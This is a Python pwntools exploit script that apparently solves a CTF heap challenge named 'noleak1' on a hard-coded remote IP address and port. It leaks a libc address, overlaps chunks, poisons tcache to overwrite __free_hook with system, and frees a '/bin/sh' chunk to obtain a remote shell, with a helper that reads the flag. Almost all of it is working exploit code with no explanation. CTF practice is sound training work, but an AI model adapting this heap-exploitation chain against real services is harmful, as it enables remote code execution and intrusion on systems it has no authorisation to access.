# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './noleak1'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc.so.6')
context.binary = binary
context.log_level = 'debug' 
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '47.108.195.119'
    port = '20182'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(idx,size):
    cmd(1)
    sla('Index?',idx)
    sla('Size?',size)

def edit(idx,content):
    cmd(3)
    sla('Index?',idx)
    sla('content:',content)

def show(idx):
    cmd(2)
    sla('Index?',idx)

def delete(idx):
    cmd(4)
    sla('Index?',idx)

# one_gad = one_gadget(libc.path)

def attack():
    sla('名称:','A1natas')
    sla('名字:','Niyah')
    key = 'N0_py_1n_tHe_ct7'
    # dbg('*$rebase(0x0000000000000FB0)')
    sa('start !',key)

    add(0 , 0x450)
    add(1 , 0x18)
    delete(0)
    add(0 , 0x450)
    show(0)

    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    
    add(2 , 0x4f8)
    add(3 , 0x18)
    delete(0)
    edit(1 , flat(0,0, 0x20 + 0x460))
    delete(2)
    add(0 , 0x450)
    add(4 , 0x18)
    delete(1)
    edit(4 , p64(__free_hook - 8))

    add(5 , 0x18)
    add(6 , 0x18)
    
    edit(6 , flat('/bin/sh\x00' , system_addr))

    delete(6)

    # dbg()

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   noleak1.py
@Time    :   2021/11/27 09:25:52
@Author  :   Niyah 
'''